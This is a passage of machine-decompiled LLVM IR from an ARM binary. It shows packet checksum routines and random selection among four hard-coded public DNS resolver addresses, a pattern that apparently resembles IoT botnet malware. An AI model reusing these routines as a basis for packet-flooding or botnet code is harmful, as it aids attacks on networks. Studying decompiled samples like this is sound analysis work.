  %v3_e2dc = add i32 %v2_e2dc, 2
  %v4_e2dc = inttoptr i32 %v3_e2dc to i8*
  store i8 %v1_e2dc, i8* %v4_e2dc, align 1
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e2e8 = load i32, i32* @r4, align 4
  store i32 %v0_e2e8, i32* %r1.global-to-local, align 4
  store i32 %v3_def4, i32* %r0.global-to-local, align 4
  %v0_e2f0 = load i32, i32* @sl, align 4
  store i32 %v0_e2f0, i32* %r2.global-to-local, align 4
  %v0_e2f4 = load i32, i32* %lr.global-to-local, align 4
  %v6_e2fc = inttoptr i32 %v0_e2e8 to i32*
  %v7_e2fc = call i32 @function_1372c(i32 %v3_def4, i32* %v6_e2fc, i32 %v0_e2f0, i32 16384, i32 %v0_e2f4, i32 16)
  %v3_e300 = load i32, i32* %stack_var_-40, align 4
  %v1_e304 = add i32 %v3_e300, 1
  store i32 %v1_e304, i32* %r0.global-to-local, align 4
  store i32 %v1_dc80, i32* %r3.global-to-local, align 4
  %v9_e30c = icmp eq i32 %v1_dc80, %v1_e304
  store i1 %v9_e30c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e304, i32* %stack_var_-40, align 4
  %v8_e314 = icmp sgt i32 %v1_dc80, %v1_e304
  br i1 %v8_e314, label %dec_label_pc_e254.dec_label_pc_e214_crit_edge, label %dec_label_pc_e318

dec_label_pc_e254.dec_label_pc_e214_crit_edge:    ; preds = %dec_label_pc_e254
  %v1_e220.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e214

dec_label_pc_e318:                                ; preds = %dec_label_pc_e254
  store i32 %v1_dc80, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e1f4

dec_label_pc_e328:                                ; preds = %dec_label_pc_e214
  %v0_e328 = call i32 @function_fe24()
  %v1_e328 = trunc i32 %v0_e328 to i8
  store i32 %v0_e328, i32* %r0.global-to-local, align 4
  store i32 %v3_df58, i32* %ip.global-to-local, align 4
  %v4_e330 = sdiv i32 %v0_e328, 256
  store i32 %v4_e330, i32* %r3.global-to-local, align 4
  %v1_e334 = load i32, i32* @r6, align 4
  %v9_e334 = icmp eq i32 %v3_df58, %v1_e334
  store i1 %v9_e334, i1* %cpsr_z.global-to-local, align 1
  %v1_e338 = trunc i32 %v4_e330 to i8
  %v2_e338 = load i32, i32* @r4, align 4
  %v3_e338 = add i32 %v2_e338, 5
  %v4_e338 = inttoptr i32 %v3_e338 to i8*
  store i8 %v1_e338, i8* %v4_e338, align 1
  %v3_e33c = load i32, i32* @r4, align 4
  %v4_e33c = add i32 %v3_e33c, 4
  %v5_e33c = inttoptr i32 %v4_e33c to i8*
  store i8 %v1_e328, i8* %v5_e33c, align 1
  %v0_e340 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e340, label %dec_label_pc_e344, label %dec_label_pc_e328.dec_label_pc_e23c_crit_edge

dec_label_pc_e328.dec_label_pc_e23c_crit_edge:    ; preds = %dec_label_pc_e328
  %v1_e240.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e23c

dec_label_pc_e344:                                ; preds = %dec_label_pc_e328, %dec_label_pc_e230
  %v0_e344 = call i32 @function_fe24()
  %v1_e344 = trunc i32 %v0_e344 to i8
  store i32 %v0_e344, i32* %r0.global-to-local, align 4
  store i32 %v3_df5c, i32* @lr, align 4
  %v4_e34c = sdiv i32 %v0_e344, 256
  store i32 %v4_e34c, i32* %r3.global-to-local, align 4
  %v1_e350 = load i32, i32* @r6, align 4
  %v9_e350 = icmp eq i32 %v3_df5c, %v1_e350
  store i1 %v9_e350, i1* %cpsr_z.global-to-local, align 1
  %v3_e354 = load i32, i32* @r4, align 4
  %v4_e354 = add i32 %v3_e354, 20
  %v5_e354 = inttoptr i32 %v4_e354 to i8*
  store i8 %v1_e344, i8* %v5_e354, align 1
  %v0_e358 = load i32, i32* %r3.global-to-local, align 4
  %v1_e358 = trunc i32 %v0_e358 to i8
  %v2_e358 = load i32, i32* @r5, align 4
  %v3_e358 = add i32 %v2_e358, 1
  %v4_e358 = inttoptr i32 %v3_e358 to i8*
  store i8 %v1_e358, i8* %v4_e358, align 1
  %v0_e35c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e35c, label %dec_label_pc_e360, label %dec_label_pc_e344.dec_label_pc_e248_crit_edge

dec_label_pc_e344.dec_label_pc_e248_crit_edge:    ; preds = %dec_label_pc_e344
  %v1_e24c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e248

dec_label_pc_e360:                                ; preds = %dec_label_pc_e344, %dec_label_pc_e23c
  %v0_e360 = call i32 @function_fe24()
  %v1_e360 = trunc i32 %v0_e360 to i8
  %v4_e364 = sdiv i32 %v0_e360, 256
  store i32 %v4_e364, i32* %r3.global-to-local, align 4
  %v3_e368 = load i32, i32* @r5, align 4
  %v4_e368 = add i32 %v3_e368, 2
  %v5_e368 = inttoptr i32 %v4_e368 to i8*
  store i8 %v1_e360, i8* %v5_e368, align 1
  store i32 %v3_df60, i32* %r0.global-to-local, align 4
  %v1_e370 = load i32, i32* @r6, align 4
  %v9_e370 = icmp eq i32 %v3_df60, %v1_e370
  store i1 %v9_e370, i1* %cpsr_z.global-to-local, align 1
  %v0_e374 = load i32, i32* %r3.global-to-local, align 4
  %v1_e374 = trunc i32 %v0_e374 to i8
  %v2_e374 = load i32, i32* @r5, align 4
  %v3_e374 = add i32 %v2_e374, 3
  %v4_e374 = inttoptr i32 %v3_e374 to i8*
  store i8 %v1_e374, i8* %v4_e374, align 1
  %v0_e378 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e378, label %dec_label_pc_e37c, label %dec_label_pc_e254

dec_label_pc_e37c:                                ; preds = %dec_label_pc_e360, %dec_label_pc_e248
  %v0_e37c = call i32 @function_fe24()
  %v1_e37c = trunc i32 %v0_e37c to i8
  store i32 %v0_e37c, i32* %r0.global-to-local, align 4
  %v4_e380 = sdiv i32 %v0_e37c, 256
  store i32 %v4_e380, i32* %r3.global-to-local, align 4
  %v3_e384 = load i32, i32* @r4, align 4
  %v4_e384 = add i32 %v3_e384, 28
  %v5_e384 = inttoptr i32 %v4_e384 to i8*
  store i8 %v1_e37c, i8* %v5_e384, align 1
  %v0_e388 = load i32, i32* %r3.global-to-local, align 4
  %v1_e388 = trunc i32 %v0_e388 to i8
  %v2_e388 = load i32, i32* @r8, align 4
  %v3_e388 = add i32 %v2_e388, 1
  %v4_e388 = inttoptr i32 %v3_e388 to i8*
  store i8 %v1_e388, i8* %v4_e388, align 1
  br label %dec_label_pc_e254

dec_label_pc_e390:                                ; preds = %dec_label_pc_de5c, %dec_label_pc_de28, %dec_label_pc_ddcc, %dec_label_pc_dc74
  %v0_e390 = call i32 @function_fe24()
  %v1_e394 = urem i32 %v0_e390, 4
  store i32 %v1_e394, i32* %r0.global-to-local, align 4
  %v2_e398 = icmp eq i32 %v1_e394, 3
  store i1 %v2_e398, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_e390 to i2
  switch i2 %trunc, label %dec_label_pc_ded020 [
    i2 0, label %dec_label_pc_e3d8
    i2 1, label %dec_label_pc_e3ec
    i2 -2, label %dec_label_pc_e3f8
    i2 -1, label %dec_label_pc_e408
  ]

dec_label_pc_e3b4:                                ; preds = %dec_label_pc_df30
  store i32 %v2_dee0, i32* %r0.global-to-local, align 4
  %v4_e3b8 = sext i8 %v5_df4c to i32
  store i32 %v4_e3b8, i32* %r1.global-to-local, align 4
  %v2_e3bc = add i32 %v4_e3b8, %v2_dee0
  store i32 %v2_e3bc, i32* @fp, align 4
  br label %dec_label_pc_e1e8

dec_label_pc_e3c4:                                ; preds = %dec_label_pc_df04
  store i32 %v3_def4, i32* %r0.global-to-local, align 4
  %v1_e3c8 = call i32 @function_12e9c(i32 %v3_def4)
  store i32 %v1_e3c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e3cc

dec_label_pc_e3cc:                                ; preds = %dec_label_pc_dedc, %dec_label_pc_ded0, %dec_label_pc_e3c4
  %v29_e3d4 = phi i32 [ %v3_def4, %dec_label_pc_dedc ], [ %v29_e3d474, %dec_label_pc_ded0 ], [ %v1_e3c8, %dec_label_pc_e3c4 ]
  store i32 %v3_dc74, i32* %r4.global-to-local, align 4
  store i32 %v15_dc74, i32* %r8.global-to-local, align 4
  store i32 %v18_dc74, i32* %sb.global-to-local, align 4
  store i32 %v21_dc74, i32* %sl.global-to-local, align 4
  store i32 %v24_dc74, i32* %fp.global-to-local, align 4
  ret i32 %v29_e3d4

dec_label_pc_e3d8:                                ; preds = %dec_label_pc_e390
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ded0

dec_label_pc_e3ec:                                ; preds = %dec_label_pc_e390
  store i32 707416650, i32* @r4, align 4
  br label %dec_label_pc_ded0

dec_label_pc_e3f8:                                ; preds = %dec_label_pc_e390
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ded0

dec_label_pc_e408:                                ; preds = %dec_label_pc_e390
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ded0

; uselistorder directives
  uselistorder i32 %v4_e3b8, { 0, 2, 1 }
  uselistorder i32 %v1_e394, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_e390, { 1, 0 }
  uselistorder i32 %v0_e37c, { 0, 2, 1 }
  uselistorder i32 %v0_e344, { 0, 2, 1 }
  uselistorder i32 %v4_e330, { 1, 0 }
  uselistorder i32 %v0_e328, { 0, 2, 1 }
  uselistorder i32 %v1_e304, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_e2a0, { 0, 2, 1 }
  uselistorder i32 %v0_e288, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e274, { 1, 0 }
  uselistorder i32 %v2_e270, { 0, 2, 1 }
  uselistorder i32 %v7_e21c, { 1, 0, 2 }
  uselistorder i32 %v4_e258.pre-phi, { 1, 0 }
  uselistorder i32 %v2_e19c, { 1, 0 }
  uselistorder i32 %v1_e19086, { 1, 0, 2 }
  uselistorder i32 %v1_e184, { 2, 1, 0 }
  uselistorder i32 %v0_e184, { 1, 2, 0 }
  uselistorder i32 %v0_e18432, { 1, 0 }
  uselistorder i32 %v1_e18433, { 2, 0, 1 }
  uselistorder i8 %extract.t78, { 1, 0 }
  uselistorder i32 %v1_e158, { 2, 0, 4, 1, 3, 5, 6 }
  uselistorder i32 %v0_e0d4, { 1, 0 }
  uselistorder i32 %v3_e010, { 1, 0, 2 }
  uselistorder i32 %v1_dfd8, { 1, 0 }
  uselistorder i32 %v1_dfcc, { 1, 0 }
  uselistorder i32 %v1_dfb0, { 1, 0 }
  uselistorder i32 %v1_df9c, { 1, 0 }
  uselistorder i32 %v3_df94, { 1, 0 }
  uselistorder i32 %v4_df8c, { 0, 4, 2, 5, 3, 1 }
  uselistorder i8 %v5_df4c, { 1, 0 }
  uselistorder i32 %v0_df48, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_df3c, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_df28, { 1, 0 }
  uselistorder i1 %v7_def8, { 1, 0 }
  uselistorder i32 %v3_def4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_dee0, { 0, 11, 1, 6, 4, 3, 7, 10, 9, 8, 5, 2 }
  uselistorder i32 %stack_var_-2176.0, { 1, 0 }
  uselistorder i32 %v1_dec8, { 1, 0, 2 }
  uselistorder i1 %v7_de98, { 1, 0 }
  uselistorder i32 %v1_de94, { 1, 0, 2 }
  uselistorder i1 %v8_de8c, { 1, 0 }
  uselistorder i1 %v7_de88, { 1, 0 }
  uselistorder i32 %v1_de7c, { 1, 0 }
  uselistorder i8 %v2_de70, { 2, 0, 1, 3 }
  uselistorder i32 %v0_de74, { 1, 0 }
  uselistorder i32 %v0_de94, { 3, 0, 2, 1 }
  uselistorder i32 %v0_de60, { 0, 2, 1 }
  uselistorder i32 %v1_de78, { 0, 2, 1 }
  uselistorder i32 %v2_de48, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_de40, { 1, 0, 2, 3 }
  uselistorder i32 %v0_de28, { 1, 2, 0, 3, 4, 5 }
  uselistorder i1 %v7_de20, { 1, 0 }
  uselistorder i32 %v0_de20, { 2, 3, 1, 4, 6, 5, 0 }
  uselistorder i32 %v0_ddc4, { 1, 0, 3, 2 }
  uselistorder i32 %v6_dd94, { 0, 3, 5, 4, 2, 1, 7, 6 }
  uselistorder i32 %v1_dd18, { 1, 0 }
  uselistorder i32 %v7_dcd4, { 0, 1, 2, 4, 3 }
  uselistorder i8 %v5_dcd0, { 1, 0 }
  uselistorder i32 %v6_dcb0, { 1, 0 }
  uselistorder i32 %v2_dc98, { 0, 3, 1, 2 }
  uselistorder i32 %v1_dc80, { 7, 4, 5, 6, 3, 8, 9, 10, 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 51, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 4, 5, 7, 6, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 46, 45, 47, 49, 48, 51, 50, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 4, 7, 6, 8, 10, 9, 11, 13, 12, 14, 15, 16, 17, 1, 18, 19, 68, 33, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 37, 34, 35, 36, 38, 40, 39, 41, 42, 43, 45, 44, 47, 46, 48, 49, 51, 50, 52, 54, 53, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 1, 2, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 21, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 30, 31, 32, 29, 26, 33, 34, 35 }
  uselistorder i32 41, { 4, 5, 6, 0, 2, 7, 1, 8, 3, 9 }
  uselistorder i32 134744072, { 1, 0 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 33686020, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10000.26 to i32), { 1, 2, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), { 0, 39, 16, 40, 15, 41, 14, 42, 1, 3, 2, 18, 43, 17, 44, 46, 4, 47, 45, 19, 48, 20, 49, 21, 50, 51, 5, 22, 52, 54, 6, 55, 53, 26, 56, 23, 57, 24, 58, 25, 59, 61, 7, 62, 60, 63, 64, 30, 65, 29, 66, 27, 67, 28, 68, 8, 9, 10, 70, 69, 31, 71, 32, 72, 73, 74, 11, 75, 76, 35, 77, 33, 78, 34, 79, 81, 12, 82, 80, 38, 83, 36, 84, 37, 85, 13, 86 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_a4e8, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 90, 91 }
  uselistorder label %dec_label_pc_e3cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e254, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e1f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e1e8, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %dec_label_pc_dea4, { 1, 0 }
  uselistorder label %dec_label_pc_de98, { 1, 0 }
  uselistorder label %dec_label_pc_de5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_de54, { 1, 0 }
}

define i32 @function_e424(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e424:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_e454, label %dec_label_pc_e430

dec_label_pc_e430:                                ; preds = %dec_label_pc_e424
  %v0_e434.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e434

dec_label_pc_e434:                                ; preds = %dec_label_pc_e434, %dec_label_pc_e430
  %v0_e448 = phi i32 [ %v2_e448, %dec_label_pc_e434 ], [ 0, %dec_label_pc_e430 ]
  %v0_e43c = phi i32 [ %v1_e43c, %dec_label_pc_e434 ], [ %arg1, %dec_label_pc_e430 ]
  %v0_e44c = phi i32 [ %v1_e44c, %dec_label_pc_e434 ], [ %v0_e434.pre, %dec_label_pc_e430 ]
  %v1_e434 = inttoptr i32 %v0_e44c to i8*
  %v2_e434 = load i8, i8* %v1_e434, align 1
  %v3_e434 = zext i8 %v2_e434 to i32
  %v1_e438 = add i32 %v0_e44c, 1
  %v2_e438 = inttoptr i32 %v1_e438 to i8*
  %v3_e438 = load i8, i8* %v2_e438, align 1
  %v4_e438 = zext i8 %v3_e438 to i32
  %v1_e43c = add i32 %v0_e43c, -2
  %v4_e440 = mul nuw nsw i32 %v4_e438, 256
  %v5_e440 = or i32 %v4_e440, %v3_e434
  %v2_e448 = add i32 %v5_e440, %v0_e448
  %v1_e44c = add i32 %v0_e44c, 2
  store i32 %v1_e44c, i32* @r0, align 4
  %v1_e43c.cmp = icmp ugt i32 %v1_e43c, 1
  br i1 %v1_e43c.cmp, label %dec_label_pc_e434, label %dec_label_pc_e454

dec_label_pc_e454:                                ; preds = %dec_label_pc_e434, %dec_label_pc_e424
  %v1_e45c = phi i32 [ 0, %dec_label_pc_e424 ], [ %v2_e448, %dec_label_pc_e434 ]
  %v0_e454 = phi i32 [ %arg1, %dec_label_pc_e424 ], [ %v1_e43c, %dec_label_pc_e434 ]
  %v7_e454 = icmp eq i32 %v0_e454, 1
  br i1 %v7_e454, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e454
  %v1_e458 = load i32, i32* @r0, align 4
  %v2_e458 = inttoptr i32 %v1_e458 to i8*
  %v3_e458 = load i8, i8* %v2_e458, align 1
  %v4_e458 = zext i8 %v3_e458 to i32
  %v3_e45c = add i32 %v1_e45c, %v4_e458
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e454, %bb
  %v0_e460 = phi i32 [ %v1_e45c, %dec_label_pc_e454 ], [ %v3_e45c, %bb ]
  %v3_e464 = urem i32 %v0_e460, 65536
  %v4_e468 = udiv i32 %v0_e460, 65536
  %v5_e468 = add nuw nsw i32 %v4_e468, %v3_e464
  %v4_e46c = udiv i32 %v5_e468, 65536
  %v5_e46c = add nuw nsw i32 %v4_e46c, %v5_e468
  %v1_e470 = urem i32 %v5_e46c, 65536
  %v3_e478 = xor i32 %v1_e470, 65535
  ret i32 %v3_e478

; uselistorder directives
  uselistorder i32 %v5_e468, { 1, 0 }
  uselistorder i32 %v1_e44c, { 1, 0 }
  uselistorder i32 %v1_e43c, { 1, 0, 2 }
  uselistorder i32 %v0_e44c, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_e480(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e480:
  %v3_e490 = urem i32 %arg2, 65536
  %v1_e494 = add i32 %arg1, 12
  %v1_e498 = inttoptr i32 %v1_e494 to i32*
  %v2_e498 = load i32, i32* %v1_e498, align 4
  %v3_e498 = add i32 %arg1, 16
  %v4_e498 = inttoptr i32 %v3_e498 to i32*
  %v5_e498 = load i32, i32* %v4_e498, align 4
  %v7_e49c = icmp sgt i32 %arg3, 1
  br i1 %v7_e49c, label %dec_label_pc_e4a8.preheader, label %dec_label_pc_e4c8

dec_label_pc_e4a8.preheader:                      ; preds = %dec_label_pc_e480
  %v0_e4a8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_e4a8

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e4a8.preheader, %dec_label_pc_e4a8
  %v0_e4bc = phi i32 [ 0, %dec_label_pc_e4a8.preheader ], [ %v2_e4bc, %dec_label_pc_e4a8 ]
  %v0_e4b0 = phi i32 [ %arg3, %dec_label_pc_e4a8.preheader ], [ %v1_e4b0, %dec_label_pc_e4a8 ]
  %v0_e4c0 = phi i32 [ %v0_e4a8.pre, %dec_label_pc_e4a8.preheader ], [ %v1_e4c0, %dec_label_pc_e4a8 ]
  %v1_e4a8 = inttoptr i32 %v0_e4c0 to i8*
  %v2_e4a8 = load i8, i8* %v1_e4a8, align 1
  %v3_e4a8 = zext i8 %v2_e4a8 to i32
  %v1_e4ac = add i32 %v0_e4c0, 1
  %v2_e4ac = inttoptr i32 %v1_e4ac to i8*
  %v3_e4ac = load i8, i8* %v2_e4ac, align 1
  %v4_e4ac = zext i8 %v3_e4ac to i32
  %v1_e4b0 = add nsw i32 %v0_e4b0, -2
  %v4_e4b4 = mul nuw nsw i32 %v4_e4ac, 256
  %v5_e4b4 = or i32 %v4_e4b4, %v3_e4a8
  %v2_e4bc = add i32 %v5_e4b4, %v0_e4bc
  %v1_e4c0 = add i32 %v0_e4c0, 2
  store i32 %v1_e4c0, i32* @r1, align 4
  %v8_e4c4 = icmp sgt i32 %v1_e4b0, 1
  br i1 %v8_e4c4, label %dec_label_pc_e4a8, label %dec_label_pc_e4c8

dec_label_pc_e4c8:                                ; preds = %dec_label_pc_e4a8, %dec_label_pc_e480
  %v1_e4d0 = phi i32 [ 0, %dec_label_pc_e480 ], [ %v2_e4bc, %dec_label_pc_e4a8 ]
  %v0_e4c8 = phi i32 [ %arg3, %dec_label_pc_e480 ], [ %v1_e4b0, %dec_label_pc_e4a8 ]
  %v7_e4c8 = icmp eq i32 %v0_e4c8, 1
  br i1 %v7_e4c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e4c8
  %v1_e4cc = load i32, i32* @r1, align 4
  %v2_e4cc = inttoptr i32 %v1_e4cc to i8*
  %v3_e4cc = load i8, i8* %v2_e4cc, align 1
  %v4_e4cc = zext i8 %v3_e4cc to i32
  %v3_e4d0 = add i32 %v4_e4cc, %v1_e4d0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e4c8, %bb
  %v0_e4f4 = phi i32 [ %v1_e4d0, %dec_label_pc_e4c8 ], [ %v3_e4d0, %bb ]
  %v3_e4d8 = urem i32 %v2_e498, 65536
  %v1_e4e0 = add i32 %arg1, 9
  %v2_e4e0 = inttoptr i32 %v1_e4e0 to i8*
  %v3_e4e0 = load i8, i8* %v2_e4e0, align 1
  %v4_e4e0 = zext i8 %v3_e4e0 to i32
  %v3_e4e4 = urem i32 %v5_e498, 65536
  %v4_e4e8 = udiv i32 %v2_e498, 65536
  %v3_e4f0 = mul nuw nsw i32 %v4_e4e0, 256
  %v4_e4f4 = udiv i32 %v5_e498, 65536
  %v5_e4f4 = add i32 %v0_e4f4, %v4_e4f4
  %v2_e4f8 = add i32 %v5_e4f4, %v3_e4f0
  %v5_e4e8 = add nuw nsw i32 %v3_e4d8, %v3_e490
  %v2_e4ec = add nuw nsw i32 %v5_e4e8, %v4_e4e8
  %v2_e4fc = add nuw nsw i32 %v2_e4ec, %v3_e4e4
  %v2_e500 = add i32 %v2_e4f8, %v2_e4fc
  %tmp = icmp ult i32 %v2_e500, 65536
  br i1 %tmp, label %dec_label_pc_e520, label %dec_label_pc_e50c

dec_label_pc_e50c:                                ; preds = %.thread, %dec_label_pc_e50c
  %v2_e5141 = phi i32 [ %v2_e514, %dec_label_pc_e50c ], [ %v2_e500, %.thread ]
  %v3_e5182.in = phi i32 [ %v2_e514, %dec_label_pc_e50c ], [ %v2_e500, %.thread ]
  %v3_e5182 = udiv i32 %v3_e5182.in, 65536
  %v3_e510 = urem i32 %v2_e5141, 65536
  %v2_e514 = add nuw nsw i32 %v3_e510, %v3_e5182
  %tmp14 = icmp ult i32 %v2_e514, 65536
  br i1 %tmp14, label %dec_label_pc_e520.loopexit, label %dec_label_pc_e50c

dec_label_pc_e520.loopexit:                       ; preds = %dec_label_pc_e50c
  br label %dec_label_pc_e520

dec_label_pc_e520:                                ; preds = %dec_label_pc_e520.loopexit, %.thread
  %v0_e520 = phi i32 [ %v2_e514, %dec_label_pc_e520.loopexit ], [ %v2_e500, %.thread ]
  %v1_e520 = urem i32 %v0_e520, 65536
  %v3_e528 = xor i32 %v1_e520, 65535
  ret i32 %v3_e528

; uselistorder directives
  uselistorder i32 %v2_e514, { 2, 1, 3, 0 }
  uselistorder i32 %v2_e500, { 3, 0, 2, 1 }
  uselistorder i32 %v1_e4d0, { 1, 0 }
  uselistorder i32 %v1_e4c0, { 1, 0 }
  uselistorder i32 %v1_e4b0, { 0, 2, 1 }
  uselistorder i32 %v0_e4c0, { 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e50c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_e4a8, { 1, 0 }
}

define i32 @function_e530(i32 %arg1) local_unnamed_addr {
dec_label_pc_e530:
  %v2_e534 = load i32, i32* @global_var_1e474.97, align 4
  %v2_e53c = call i32 @function_12f9c(i32 %v2_e534, i32 9)
  %v0_e540 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e540, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_e530
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_e530, %bb
  ret i32 %v2_e53c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_e544(i32 %arg1) local_unnamed_addr {
dec_label_pc_e544:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-581 = alloca i8, align 1
  %stack_var_-8773 = alloca i32, align 4
  %stack_var_-4677 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_e544 = load i32, i32* @r4, align 4
  store i32 %v3_e544, i32* %stack_var_-36, align 4
  %v6_e544 = load i32, i32* @r5, align 4
  %v9_e544 = load i32, i32* @r6, align 4
  %v12_e544 = load i32, i32* @r7, align 4
  %v15_e544 = load i32, i32* @r8, align 4
  %v18_e544 = load i32, i32* @sb, align 4
  %v21_e544 = load i32, i32* @sl, align 4
  %v24_e544 = load i32, i32* @fp, align 4
  %v2_e558 = ptrtoint i32* %stack_var_-4677 to i32
  store i32 %v2_e558, i32* @sl, align 4
  %v3_e560 = mul i32 %arg1, 65536
  store i32 %v3_e560, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_e56c = ptrtoint i32* %stack_var_-8773 to i32
  %v2_e578 = bitcast i32* %stack_var_-4677 to i8*
  %v3_e578 = call i32 @function_134d0(i8* %v2_e578, i32 0)
  store i32 4096, i32* @r2, align 4
  %v2_e590 = bitcast i32* %stack_var_-8773 to i8*
  %v3_e590 = call i32 @function_134d0(i8* %v2_e590, i32 0)
  %v2_e594 = ptrtoint i8* %stack_var_-581 to i32
  store i32 %v2_e594, i32* @r6, align 4
  store i32 513, i32* @r2, align 4
  %v3_e5b4 = call i32 @function_134d0(i8* nonnull %stack_var_-581, i32 0)
  %v2_e5b8 = ptrtoint i8* %stack_var_-68 to i32
  %v1_e5c0 = load i32, i32* @r5, align 4
  %v4_e5c0 = udiv i32 %v1_e5c0, 16777216
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_e5e0 = trunc i32 %v4_e5c0 to i8
  %v4_e5e0 = call i32 @function_129d0(i8 %v3_e5e0, i32 16, i32 %v2_e5b8)
  %v2_e5e8 = call i32 @function_124dc(i8* nonnull %stack_var_-68)
  %v7_e5ec = icmp eq i32 %v2_e5e8, 2
  br i1 %v7_e5ec, label %dec_label_pc_ea80, label %dec_label_pc_e5f4

dec_label_pc_e5f4:                                ; preds = %dec_label_pc_e544, %dec_label_pc_ea80
  %v1_e5f8 = call i32 @function_11c08(i32 6)
  %v1_e600 = call i32 @function_11c08(i32 7)
  %v1_e608 = call i32 @function_11c08(i32 9)
  %v0_e610 = load i32, i32* @r4, align 4
